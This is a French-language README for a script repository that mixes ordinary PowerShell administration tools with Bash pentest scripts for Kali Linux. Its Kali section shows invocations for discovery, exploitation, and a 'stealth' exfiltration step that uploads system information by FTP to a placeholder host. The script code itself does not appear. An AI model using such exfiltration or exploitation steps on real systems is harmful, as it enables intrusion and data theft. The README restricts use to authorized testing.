# PowerShell Scripts Repository

Ce dépôt contient une collection de scripts PowerShell utiles pour l'administration système et l'automatisation de tâches courantes.

## 📂 Structure du dépôt

```
scripts/
├── linux/             # Scripts Bash pour Linux
│   ├── setup_api.sh
│   ├── pentest_discovery.sh
│   ├── pentest_verification.sh
│   ├── pentest_exploitation.sh
│   ├── scan_wifi.sh
│   └── stealth_post.sh
├── powershell/        # Scripts PowerShell pour Windows
│   ├── DiskUsageReport.ps1
│   ├── Get-SystemInfo.ps1
│   ├── ManageServices.ps1
│   ├── VMManagement.ps1
│   ├── LinkCrawler.ps1
│   ├── TeamsManagement.ps1
│   ├── ExchangeOnlineManagement.ps1
│   ├── UserManagement.ps1
│   └── SecurityCheck.ps1
├── sample_logs.json   # Journalisation fictive pour tests
```

Le fichier `targets.txt` à la racine contient la liste des cibles pour les scripts de pentest. Les scripts Bash utilisent un chemin relatif basé sur leur propre emplacement pour le retrouver, ce qui permet de les lancer depuis n'importe quel répertoire.

## 🛠️ Prérequis / Prerequisites

- **Outils / Tools** : `nmap`, `gvm-cli` et les modules PowerShell nécessaires (Hyper-V, ExchangeOnlineManagement, Teams, etc.).
- **Privilèges / Privileges** : certains scripts exigent des droits administrateur ou root.

## ⚙️ Utilisation rapide

Les scripts peuvent être lancés via PowerShell :

```powershell
# Exemple : afficher les informations système
.\scripts\powershell\Get-SystemInfo.ps1

# Exemple : vérifier l'état d'un service
.\scripts\powershell\ManageServices.ps1 -Action status -ServiceName spooler

# Exemple : lister les machines virtuelles Hyper-V
.\scripts\powershell\VMManagement.ps1 -Action list

# Exemple : démarrer une machine virtuelle
.\scripts\powershell\VMManagement.ps1 -Action start -VMName "TestVM"
# Exemple : lister les equipes Teams
.\scripts\powershell\TeamsManagement.ps1 -Action list
# Exemple : créer un canal Teams
.\scripts\powershell\TeamsManagement.ps1 -Action createchannel -TeamName "Marketing" -ChannelName "Général"
# Exemple : ajouter plusieurs membres depuis un CSV
.\scripts\powershell\TeamsManagement.ps1 -Action bulkadd -TeamName "Marketing" -CsvPath .\users.csv
# Exemple : lister les boîtes aux lettres Exchange Online
.\scripts\powershell\ExchangeOnlineManagement.ps1 -Action list
# Exemple : vérifier les paramètres de sécurité
.\scripts\powershell\SecurityCheck.ps1
```
> **Note :** `ManageServices.ps1` et `UserManagement.ps1` doivent être exécutés dans une session PowerShell élevée.
> **Exemple :** cherchez "PowerShell" dans le menu Démarrer, faites un clic droit puis sélectionnez "Exécuter en tant qu'administrateur".

Chacun des scripts possède des paramètres décrits en début de fichier.

```bash
# Installation de l'API Mistral
# Le script télécharge install.sh séparément et vérifie son empreinte SHA-256
bash scripts/linux/setup_api.sh
# Activer l'environnement virtuel puis lancer l'API
source /opt/mistral-env/bin/activate
python ~/mistral_api.py
```

### Scripts Kali Linux

```bash

# Phase de découverte (scan complet et scripts de vulnérabilités)
bash scripts/linux/pentest_discovery.sh
# Phase de vérification des vulnérabilités
bash scripts/linux/pentest_verification.sh
# Phase d'exploitation (si autorisée)
bash scripts/linux/pentest_exploitation.sh
# Exfiltration basique (si autorisée)
export FTP_USER="utilisateur"
export FTP_PASS="motdepasse"
export FTP_HOST="exemple.com"
export FTP_PATH="uploads/sysinfo.txt"
bash scripts/linux/stealth_post.sh
```

## ⚠️ Disclaimer / Avertissement

Pentest scripts (dont `pentest_discovery.sh`, `pentest_verification.sh`, `pentest_exploitation.sh`) et `stealth_post.sh` doivent être utilisés uniquement sur des systèmes pour lesquels vous disposez d'une autorisation explicite.

Pentest scripts and `stealth_post.sh` must only be run on systems where you have been granted explicit permission. Unauthorized use may be illegal.

## License

This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.
